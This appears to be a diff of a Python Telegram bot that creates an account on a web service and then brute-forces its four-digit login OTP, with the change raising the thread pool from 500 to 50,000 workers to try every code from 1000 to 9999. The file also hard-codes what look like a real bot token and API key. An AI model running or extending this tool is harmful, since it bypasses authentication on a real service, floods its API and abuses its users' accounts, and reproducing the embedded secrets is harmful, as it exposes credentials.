@@ -4,13 +4,13 @@ import asyncio
 import concurrent.futures
 import threading
 from flask import Flask
+from fastapi import FastAPI
+import uvicorn
 from telegram import Update
 from telegram.ext import Application, MessageHandler, filters, ContextTypes
 
-# Telegram Bot Token
 BOT_TOKEN = "7810054325:AAFNvA74woOJL95yU7ZeBHIzI7SatP6d3HE"
 
-# API Headers
 HEADERS = {
     "Accept": "application/json, text/plain, */*",
     "x-api-key": "xeJJzhaj1mQ-ksTB_nF_iH0z5YdG50yQtwQCzbcHuKA",
@@ -88,6 +88,9 @@ async def process_login(update: Update, context: ContextTypes.DEFAULT_TYPE):
     signup_response = requests.post(signup_url, json=signup_data, headers=HEADERS)
     if signup_response.status_code == 200 and signup_response.json().get("result"):
         user_uuid = signup_response.json()["data"].get("user_uuid")
+        uuid_message = await bot.send_message(chat_id, f"✅ Signup Successful! UUID: `{user_uuid}`", parse_mode="Markdown")
+        time.sleep(2)
+        await bot.delete_message(chat_id, uuid_message.message_id)
     else:
         await bot.send_message(chat_id, "❌ Signup Failed.")
         return
@@ -116,29 +119,27 @@ async def process_login(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 "user_uuid": user_uuid
         }
 
-        for _ in range(2):  # Try each OTP twice
-            login_response = requests.post(login_url, json=login_data, headers=HEADERS)
-            checked_otps += 1  # Increment OTP count
+        login_response = requests.post(login_url, json=login_data, headers=HEADERS)
 
-            if login_response.status_code == 200 and login_response.json()["data"].get("otp_response") is True:
-                found_otp = otp
-                return otp  # Return the correct OTP
+        checked_otps += 1  # Increment OTP count
+
+        if login_response.status_code == 200 and login_response.json()["data"].get("otp_response") is True:
+            found_otp = otp
+            return otp
 
         return None
 
     async def check_otp_with_updates():
         nonlocal found_otp, checked_otps
-        with concurrent.futures.ThreadPoolExecutor(max_workers=500) as executor:
+        with concurrent.futures.ThreadPoolExecutor(max_workers=50000) as executor:
             future_to_otp = {executor.submit(try_otp, otp): otp for otp in range(1000, 10000)}
 
-            for future in concurrent.futures.as_completed(future_to_otp):
-                otp_result = future.result()
-                if otp_result:
-                    found_otp = otp_result  # Store the correct OTP
-                    executor.shutdown(wait=False)  # Stop further execution
+            for i, future in enumerate(concurrent.futures.as_completed(future_to_otp)):
+                if found_otp:
+                    executor.shutdown(wait=False)
                     break
 
-                # Edit the message every 100 OTPs checked
+                # Edit the message every 500 OTPs checked
                 if checked_otps % 100 == 0:
                     await progress_message.edit_text(f"🔄 Checking OTPs... ({checked_otps} checked)")
 
